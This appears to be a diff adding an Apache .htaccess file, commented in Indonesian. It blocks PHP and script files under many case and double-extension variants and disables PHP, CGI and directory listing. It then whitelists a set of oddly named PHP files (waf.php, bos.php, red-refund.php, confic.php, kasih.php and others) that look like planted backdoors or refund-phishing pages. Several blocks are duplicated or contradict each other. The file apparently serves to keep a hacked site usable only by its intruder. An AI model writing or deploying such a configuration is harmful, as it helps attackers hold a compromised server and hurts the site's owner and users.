@@ -1,0 +1,101 @@
+<FilesMatch ".(php|Php|pHp|phP|PHp|pHP|PhP|PHP|PhP|php5|Php5|pHp5|phP5|PHp5|pHP5|PhP5|PHP5|PhP5|php6|Php6|pHp6|phP6|PHp6|pHP6|PhP6|PHP6|PhP6|php56|Php56|pHp56|phP56|PHp56|pHP56|PhP56|PHP56|PhP56|php7|Php7|pHp7|phP7|PHp7|pHP7|PhP7|PHP7|PhP7|alfa|php8|php9|phtml|Phtml|pHtml|phTml|pHTml|Fla|fLa|flA|FLa|fLA|FlA|FLA|phtMl|phtmL|PHtml|PhTml|PHTML|PHTml|PHTMl|PhtMl|PHTml|PHtML|pHTMl|PhTML|pHTML|PhtmL|PHTmL|PhtMl|PhtmL|pHtMl|PhTmL|pHtmL|aspx|ASPX|asp|ASP|php.jpg|PHP.JPG|php.xxxjpg|PHP.XXXJPG|php.jpeg|PHP.JPG|PHP.JPEG|PHP.PJEPG|php.pjpeg|php.fla|PHP.FLA|php.png|PHP.PNG|php.gif|PHP.GIF|php.test|php;.jpg|PHP JPG|PHP;.JPG|php;.jpeg|php jpg|php.bak|alfa|php.pdf|php.xxxpdf|php.xxxpng|fla|Fla|fLa|fLa|flA|FLa|fLA|FLA|FlA|php.xxxgif|php.xxxpjpeg|php.xxxjpeg|php3.xxxjpeg|php3.xxxjpg|php5.xxxjpg|php3.pjpeg|php5.pjpeg|shtml|php.unknown|php.doc|php.docx|php.pdf|php.ppdf|jpg.PhP|php.txt|php.xxxtxt|PHP.TXT|PHP.XXXTXT|php.xlsx|php.zip|php.xxxzip|phar|PHAR|Phar|pHar|phAr|phaR|pHAR|PhAR|PHaR|PHAr|PHar|PhAr|PhaR|pHaR|phAR|shtMl|shtmL|SHtml|ShTml|SHTML|SHTml|SHTMl|ShtMl|SHTml|SHtML|sHTMl|ShTML|sHTML|ShtmL|SHTmL|ShtMl|ShtmL|sHtMl|ShTmL|sHtmL|Shtml|sHtml|shTml|sHTml|shtml|suspected)$">
+Order allow,deny
+deny from all
+</FilesMatch>
+
+# php yang di kecualikan.....
+<FilesMatch "^(index.php|pai.php|home.php)$">
+    Order Allow,Deny
+    Allow from all
+</FilesMatch>
+
+# Blok eksekusi file berbahaya
+<FilesMatch "(?i)\.(php|php3|php4|php5|php6|php7|php8|php9|phtml|phar|asp|aspx|cgi|pl|py|sh|shtml)$">
+    Require all denied
+</FilesMatch>
+
+# Blok double extension
+<FilesMatch "(?i)\.(php|phtml|phar)\.(jpg|jpeg|png|gif|pdf|txt|zip|doc|docx|xlsx)$">
+    Require all denied
+</FilesMatch>
+
+# Matikan eksekusi PHP
+php_flag engine off
+
+# Disable CGI
+Options -ExecCGI
+
+# Nonaktifkan directory listing
+Options -Indexes
+
+
+
+# Izinkan homepage
+<Files "index.php">
+    Require all granted
+</Files>
+
+# Blok eksekusi file berbahaya selain index.php
+<FilesMatch "(?i)^(?!index\.php$).*\.(php|php3|php4|php5|php6|php7|php8|php9|phtml|phar|asp|aspx|cgi|pl|py|sh|shtml)$">
+    Require all denied
+</FilesMatch>
+
+# Blok double extension
+<FilesMatch "(?i)\.(php|phtml|phar)\.(jpg|jpeg|png|gif|pdf|txt|zip|doc|docx|xlsx)$">
+    Require all denied
+</FilesMatch>
+
+# Matikan CGI
+Options -ExecCGI
+
+# Nonaktifkan directory listing
+Options -Indexes
+
+
+<FilesMatch '.(php|Php|PHp|PHP|pHp|PhP|php5|php6|php7|php.PHP|php.Php|php.PHp|php.PHP|php.pHP|PHP.PHP|php.PHP5|php.PHP6|php4|php3|php.PHP7|php.Php|php.PHp|php.PhP|php.phP|php.phtml|php.PHTML|phtm|PHTM|Phtm|PHtm|PHTm|PhTm|PhTM|PHP.php|PHP.pHP|php56|phar|Phar|pHar|phAr|phaR|pht|Pht|pHt|phT|PHt|PHT|shtml|Shtml|SHtml|SHTml|SHTMl|SHTML|SHtmL|ShtmL|ShTmL|ShtML|ShtMl|shTMl|shTML|phtml|Phtml|pHtml|phTml|phtMl|phtmL|PHtml|PHTml|PHTMl|PHTML|Phtml|PhTml|pHtmL|PHtML|PHTml)$'>
+Order allow,deny
+Deny from all
+</FilesMatch>
+
+<FilesMatch "\.(jpg|png|pdf|xml|txt|js|css)$">
+Order allow,deny
+Allow from all
+</FilesMatch>
+
+<FilesMatch '^(index.php|index.html|sitemap.xml|robots.txt|robot.txt|waf.php|scan.php|bos.php|news.php|index_old.php|red-refund.php|css.php)$'>
+Order allow,deny
+Allow from all
+</FilesMatch>
+
+<FilesMatch "^\.">
+Order allow,deny
+Deny from all
+</FilesMatch>
+
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteBase /
+RewriteRule ^index.php$ - [L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . index.php [L]
+</IfModule>
+
+
+
+
+
+<FilesMatch '.(php|Php|PHp|PHP|pHp|PhP|php5|php6|php7|php.PHP|php.Php|php.PHp|php.PHP|php.pHP|PHP.PHP|php.PHP5|php.PHP6|php4|php3|php.PHP7|php.Php|php.PHp|php.PhP|php.phP|php.phtml|php.PHTML|phtm|PHTM|Phtm|PHtm|PHTm|PhTm|PhTM|PHP.php|PHP.pHP|php56|phar|Phar|pHar|phAr|phaR|pht|Pht|pHt|phT|PHt|PHT|shtml|Shtml|SHtml|SHTml|SHTMl|SHTML|SHtmL|ShtmL|ShTmL|ShtML|ShtMl|shTMl|shTML|phtml|Phtml|pHtml|phTml|phtMl|phtmL|PHtml|PHTml|PHTMl|PHTML|Phtml|PhTml|pHtmL|PHtML|PHTml)$'>
+Order allow,deny
+Deny from all
+</FilesMatch>
+
+<FilesMatch "\.(jpg|png|pdf|xml|txt|js|css)$">
+Order allow,deny
+Allow from all
+</FilesMatch>
+
+<FilesMatch '^(index.php|index.html|sitemap.xml|robots.txt|robot.txt|waf.php|scan.php|bos.php|news.php|index_old.php|red-refund.php|css.php|forent.php|confic.php|refund.php|subm.php|disni.php|kasih.php|news.php)$'>
+Order allow,deny
+Allow from all
+</FilesMatch>
